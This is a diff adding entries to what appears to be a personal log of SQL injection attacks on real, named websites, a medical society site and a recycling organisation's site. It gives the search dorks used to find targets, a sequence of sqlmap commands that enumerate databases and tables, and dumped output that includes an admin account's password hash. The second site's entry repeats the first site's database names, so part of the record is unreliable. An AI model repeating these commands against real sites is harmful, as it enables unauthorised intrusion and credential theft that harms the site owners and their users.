@@ -226,3 +226,61 @@ Table: admin
 +----------+
 | 1        |
 +----------+
+
+7. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 -D culosmus_muscul -T admin --dump
+Database: culosmus_muscul
+Table: admin
+[1 entry]
++---------+----------+------+--------+----------------------------------+
+| user_id | entry_id | type | status | password                         |
++---------+----------+------+--------+----------------------------------+
+| admin   | 1        | 0    | 1      | 25a41cec631264f04815eda23dc6edd9 |
++---------+----------+------+--------+----------------------------------+
+
+
+
+<!-- Website Details http://musculoskeletalsociety.in  -->
+
+Target Website: http://musculoskeletalsociety.in
+Search: site:http://musculoskeletalsociety.in /php?id=
+Terget Link: http://musculoskeletalsociety.in/page.php?id=5
+1. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 --batch --dbs (--batch command is no enter yes or no)
+[19:18:00] [INFO] the back-end DBMS is MySQL
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[19:18:00] [INFO] fetching database names
+[19:18:02] [INFO] resumed: 'culosmus_muscul'
+[19:18:02] [INFO] resumed: 'information_schema'
+available databases [2]:
+[*] culosmus_muscul
+[*] information_schema
+
+2. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 --batch -D culosmus_muscul --tables 
+3. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 --batch -D culosmus_muscul -T admin --columns
+4. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 --batch -D culosmus_muscul -T admin -C entry_id,password,status,type,user_id --dump
+Database: culosmus_muscul
+Table: admin
+[1 entry]
++----------+----------------------------------+--------+------+---------+
+| entry_id | password                         | status | type | user_id |
++----------+----------------------------------+--------+------+---------+
+| 1        | 25a41cec631264f04815eda23dc6edd9 | 1      | 0    | admin   |
++----------+----------------------------------+--------+------+---------+
+
+5. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 --batch -D culosmus_muscul -T admin -C* --dump
+
+
+
+
+<!-- Website Details http://berkeleyrecycling.org  -->
+
+Target Website: http://berkeleyrecycling.org
+Search: site:http://berkeleyrecycling.org /php?id=
+Terget Link: http://berkeleyrecycling.org/page.php?id=1
+1. command: sqlmap.py -u http://berkeleyrecycling.org/page.php?id=1 --batch --dbs
+available databases [2]:
+[*] culosmus_muscul
+[*] information_schema
+
+
+
